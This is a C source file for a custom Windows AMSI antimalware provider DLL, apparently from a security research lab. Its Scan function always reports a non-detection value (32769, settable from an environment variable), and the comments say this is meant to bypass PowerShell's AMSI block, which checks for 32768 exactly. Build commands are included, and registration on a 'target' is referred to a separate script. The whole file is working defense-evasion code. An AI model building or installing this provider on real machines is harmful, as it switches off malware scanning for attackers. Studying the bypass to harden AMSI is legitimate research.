/* amsi-dev-provider.c
 *
 * Minimal in-proc COM AMSI provider that implements IAntimalwareProvider
 * and ALWAYS returns a configurable AMSI_RESULT. Used ONLY to prove
 * iter19 Lane A: PowerShell's PerformSecurityChecks checks `== 32768`
 * exactly, so a provider returning 32769 should bypass PowerShell's
 * block.
 *
 * Compile with mingw-w64 x86_64 as a DLL:
 *   x86_64-w64-mingw32-gcc amsi-dev-provider.c -shared -o AmsiDevProvider.dll
 *     -Wl,--kill-at -luuid -lole32 -ladvapi32
 *
 * Register on target: see register-dev-provider.ps1.
 */

#include <windows.h>
#define INITGUID
#include <objbase.h>
#include <unknwn.h>
#include <initguid.h>
#include <stdio.h>

/* AMSI SDK bits (minimal) */
typedef enum _AMSI_RESULT {
    AMSI_RESULT_CLEAN                   = 0,
    AMSI_RESULT_NOT_DETECTED            = 1,
    AMSI_RESULT_BLOCKED_BY_ADMIN_START  = 16384,
    AMSI_RESULT_BLOCKED_BY_ADMIN_END    = 20479,
    AMSI_RESULT_DETECTED                = 32768
} AMSI_RESULT;

/* IAmsiStream GUID {3E47F2E5-81D4-4D3B-897F-545CBF8E7CBB} */
DEFINE_GUID(IID_IAmsiStream, 0x3E47F2E5, 0x81D4, 0x4D3B,
    0x89, 0x7F, 0x54, 0x5C, 0xBF, 0x8E, 0x7C, 0xBB);

/* IAntimalwareProvider GUID {B2CABFE3-FE04-42B1-A5DF-08D483D4D125} */
DEFINE_GUID(IID_IAntimalwareProvider, 0xB2CABFE3, 0xFE04, 0x42B1,
    0xA5, 0xDF, 0x08, 0xD4, 0x83, 0xD4, 0xD1, 0x25);

/* Our provider CLSID: {A1B19999-DEAD-BEEF-CAFE-000000001234} */
DEFINE_GUID(CLSID_DevProvider, 0xA1B19999, 0xDEAD, 0xBEEF,
    0xCA, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x12, 0x34);

/* The AMSI_RESULT we always return. Pulled from env for easy change at
 * run time: AMSI_DEV_RESULT=32769 ./probe. Falls back to 32769. */
static ULONG g_result_override = 32769;

/* IAmsiStream vtable (we never call it, declare for completeness) */
typedef struct IAmsiStream IAmsiStream;

/* IAntimalwareProvider vtable (manual) */
typedef struct IAntimalwareProvider IAntimalwareProvider;
typedef struct IAntimalwareProviderVtbl {
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(IAntimalwareProvider*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(IAntimalwareProvider*);
    ULONG   (STDMETHODCALLTYPE *Release)(IAntimalwareProvider*);
    HRESULT (STDMETHODCALLTYPE *Scan)(IAntimalwareProvider*, IAmsiStream*, ULONG*);
    void    (STDMETHODCALLTYPE *CloseSession)(IAntimalwareProvider*, ULONGLONG);
    HRESULT (STDMETHODCALLTYPE *DisplayName)(IAntimalwareProvider*, LPWSTR*);
} IAntimalwareProviderVtbl;

struct IAntimalwareProvider {
    const IAntimalwareProviderVtbl *lpVtbl;
    LONG refs;
};

static HRESULT STDMETHODCALLTYPE Prov_QueryInterface(IAntimalwareProvider *self, REFIID riid, void **ppv) {
    if (!ppv) return E_POINTER;
    if (IsEqualIID(riid, &IID_IUnknown) || IsEqualIID(riid, &IID_IAntimalwareProvider)) {
        *ppv = self;
        self->lpVtbl->AddRef(self);
        return S_OK;
    }
    *ppv = NULL;
    return E_NOINTERFACE;
}

static ULONG STDMETHODCALLTYPE Prov_AddRef(IAntimalwareProvider *self) {
    return (ULONG)InterlockedIncrement(&self->refs);
}

static ULONG STDMETHODCALLTYPE Prov_Release(IAntimalwareProvider *self) {
    LONG r = InterlockedDecrement(&self->refs);
    if (r == 0) HeapFree(GetProcessHeap(), 0, self);
    return (ULONG)r;
}

static HRESULT STDMETHODCALLTYPE Prov_Scan(IAntimalwareProvider *self, IAmsiStream *stream, ULONG *result) {
    (void)self; (void)stream;
    if (!result) return E_POINTER;
    *result = g_result_override;
    return S_OK;
}

static void STDMETHODCALLTYPE Prov_CloseSession(IAntimalwareProvider *self, ULONGLONG session) {
    (void)self; (void)session;
}

static HRESULT STDMETHODCALLTYPE Prov_DisplayName(IAntimalwareProvider *self, LPWSTR *name) {
    (void)self;
    if (!name) return E_POINTER;
    const WCHAR *n = L"AmsiDevProvider (iter19 lab)";
    size_t len = (wcslen(n) + 1) * sizeof(WCHAR);
    *name = (LPWSTR)CoTaskMemAlloc(len);
    if (!*name) return E_OUTOFMEMORY;
    memcpy(*name, n, len);
    return S_OK;
}

static const IAntimalwareProviderVtbl g_ProvVtbl = {
    Prov_QueryInterface, Prov_AddRef, Prov_Release,
    Prov_Scan, Prov_CloseSession, Prov_DisplayName,
};

/* IClassFactory vtable */
typedef struct {
    const IClassFactoryVtbl *lpVtbl;
    LONG refs;
} MyCF;

static HRESULT STDMETHODCALLTYPE CF_QueryInterface(IClassFactory *self, REFIID riid, void **ppv) {
    if (!ppv) return E_POINTER;
    if (IsEqualIID(riid, &IID_IUnknown) || IsEqualIID(riid, &IID_IClassFactory)) {
        *ppv = self;
        self->lpVtbl->AddRef(self);
        return S_OK;
    }
    *ppv = NULL;
    return E_NOINTERFACE;
}

static ULONG STDMETHODCALLTYPE CF_AddRef(IClassFactory *self) {
    return (ULONG)InterlockedIncrement(&((MyCF*)self)->refs);
}

static ULONG STDMETHODCALLTYPE CF_Release(IClassFactory *self) {
    MyCF *cf = (MyCF*)self;
    LONG r = InterlockedDecrement(&cf->refs);
    return (ULONG)r;
}

static HRESULT STDMETHODCALLTYPE CF_CreateInstance(IClassFactory *self, IUnknown *outer, REFIID riid, void **ppv) {
    (void)self;
    if (outer) return CLASS_E_NOAGGREGATION;
    if (!ppv) return E_POINTER;

    IAntimalwareProvider *prov = (IAntimalwareProvider*)HeapAlloc(GetProcessHeap(), 0, sizeof(*prov));
    if (!prov) return E_OUTOFMEMORY;
    prov->lpVtbl = &g_ProvVtbl;
    prov->refs = 1;

    HRESULT hr = prov->lpVtbl->QueryInterface(prov, riid, ppv);
    prov->lpVtbl->Release(prov);
    return hr;
}

static HRESULT STDMETHODCALLTYPE CF_LockServer(IClassFactory *self, BOOL lock) {
    (void)self; (void)lock;
    return S_OK;
}

static const IClassFactoryVtbl g_CFVtbl = {
    CF_QueryInterface, CF_AddRef, CF_Release,
    CF_CreateInstance, CF_LockServer,
};

static MyCF g_cf = { &g_CFVtbl, 1 };

__declspec(dllexport) HRESULT STDAPICALLTYPE DllGetClassObject(REFCLSID clsid, REFIID riid, void **ppv) {
    if (!IsEqualCLSID(clsid, &CLSID_DevProvider)) return CLASS_E_CLASSNOTAVAILABLE;
    return g_cf.lpVtbl->QueryInterface((IClassFactory*)&g_cf, riid, ppv);
}

__declspec(dllexport) HRESULT STDAPICALLTYPE DllCanUnloadNow(void) {
    return S_OK;
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID resv) {
    (void)h; (void)resv;
    if (reason == DLL_PROCESS_ATTACH) {
        char buf[32];
        DWORD n = GetEnvironmentVariableA("AMSI_DEV_RESULT", buf, sizeof(buf));
        if (n > 0 && n < sizeof(buf)) {
            char *end;
            unsigned long v = strtoul(buf, &end, 0);
            if (end != buf) g_result_override = (ULONG)v;
        }
    }
    return TRUE;
}
